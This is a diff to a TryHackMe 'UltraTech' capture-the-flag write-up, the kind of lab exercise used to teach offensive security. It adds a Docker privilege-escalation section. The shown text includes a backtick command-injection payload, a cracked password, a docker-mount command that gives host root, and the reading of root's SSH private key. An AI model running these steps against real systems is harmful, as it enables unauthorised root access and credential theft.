@@ -4,18 +4,18 @@
 **Room Name:** UltraTech  
 **Platform:** TryHackMe  
 **Difficulty:** Medium  
-**Category:** Web / Command Injection / SQLite / Hash Cracking
+**Category:** Web / Command Injection / SQLite / Hash Cracking / Docker
 
-Linux machine running a Node.js API server on port 8081 alongside an Apache web server on port 31331. Command injection in an exposed `/ping` endpoint is exploited via backtick substitution to extract a SQLite database; MD5 hashes are cracked with hashcat to gain SSH access.
+Linux machine running a Node.js API server on port 8081 alongside an Apache web server on port 31331. Command injection in an exposed `/ping` endpoint extracts a SQLite database; cracked MD5 hashes give SSH access, then docker group membership escalates to root.
 
 Attack chain overview:
 
 - Port scan → FTP(21), SSH(22), Node.js API(8081), Apache(31331)
 - `robots.txt` → `/utech_sitemap.txt` → `/partners.html` → `api.js` exposes `/ping?ip=` and `/auth`
-- Command injection confirmed in `/ping`; shell metacharacters need URL encoding; backtick substitution (`%60whoami%60`) succeeds where `;` fails
+- Command injection in `/ping`; backtick substitution (`%60whoami%60`) succeeds where `;` fails
 - Filesystem enumeration via injection discovers `/home/www/api/utech.db.sqlite`
-- `cat` on the SQLite file leaks two MD5 hashes (`r00t`, `admin`) as a single ping error string
-- `hashcat -m 0` cracks `r00t`'s hash → SSH login
+- `cat` leaks two MD5 hashes; `hashcat -m 0` cracks `r00t:n100906` → SSH
+- `id` reveals docker group; `docker run -v /:/mnt bash chroot /mnt sh` → root → `/root/.ssh/id_rsa`
 
 ---
 
@@ -261,6 +261,67 @@ r00t@ultratech-prod:~$
 
 ---
 
+## 👑 7. Privilege Escalation: r00t → root (Docker)
+
+### SUID enumeration (dead end)
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+Nothing non-standard stood out. Moved to checking group memberships.
+
+### Docker group — the real vector
+
+```bash
+id
+```
+
+```text
+uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
+```
+
+`r00t` is a member of the `docker` group. This is a well-known privilege escalation path: any user who can run `docker` can mount the host filesystem into a container and operate on it as root, because the Docker daemon itself runs as root.
+
+```bash
+docker images
+```
+
+```text
+REPOSITORY  TAG     IMAGE ID      CREATED
+bash        latest  495d6437fc1e  ...
+```
+
+A `bash` image is available — no need to pull anything.
+
+### Exploitation
+
+```bash
+docker run -v /:/mnt --rm -it bash chroot /mnt sh
+```
+
+- `-v /:/mnt` — mounts the host's entire root filesystem into the container at `/mnt`
+- `chroot /mnt` — shifts the container's root to `/mnt`, making all paths resolve against the host filesystem
+- The container process runs as root, so this is effectively unrestricted root access to the host
+
+```bash
+whoami
+# → root
+```
+
+**ROOT ACCESS GRANTED.** ✅
+
+### Flag retrieval
+
+```bash
+cd /root/.ssh
+cat id_rsa
+```
+
+The root SSH private key was retrieved, completing the room.
+
+---
+
 ## 📚 Key Takeaways
 
 - 🐚 **Shell metacharacters in curl must be URL-encoded or quoted:** `&&` and `;` are consumed by the local shell before curl fires if the URL isn't quoted. Even after quoting, the server may not treat `;` as a separator — URL-encoding (`%3B`) doesn't guarantee the server's shell parses it as such either.
@@ -273,6 +334,8 @@ r00t@ultratech-prod:~$
 
 - 🗺️ **`robots.txt` → sitemap → hidden pages is a standard enumeration chain:** `robots.txt` pointed to `/utech_sitemap.txt`, which listed `/partners.html`. Neither would have appeared in a standard directory brute-force. Always read `robots.txt` before throwing wordlists at a target.
 
+- 🐳 **Docker group membership = effective root:** Any user in the `docker` group can mount the host filesystem into a container that runs as root. `id` should always be run immediately after gaining a shell — group memberships can be more valuable than SUID binaries. This is listed on GTFOBins and is a standard post-exploitation check.
+
 ---
 
 ## 🛠️ Tools Used
@@ -281,6 +344,7 @@ r00t@ultratech-prod:~$
 - `curl`
 - `hashcat`
 - `ssh`
+- `docker`
 
 ---
 
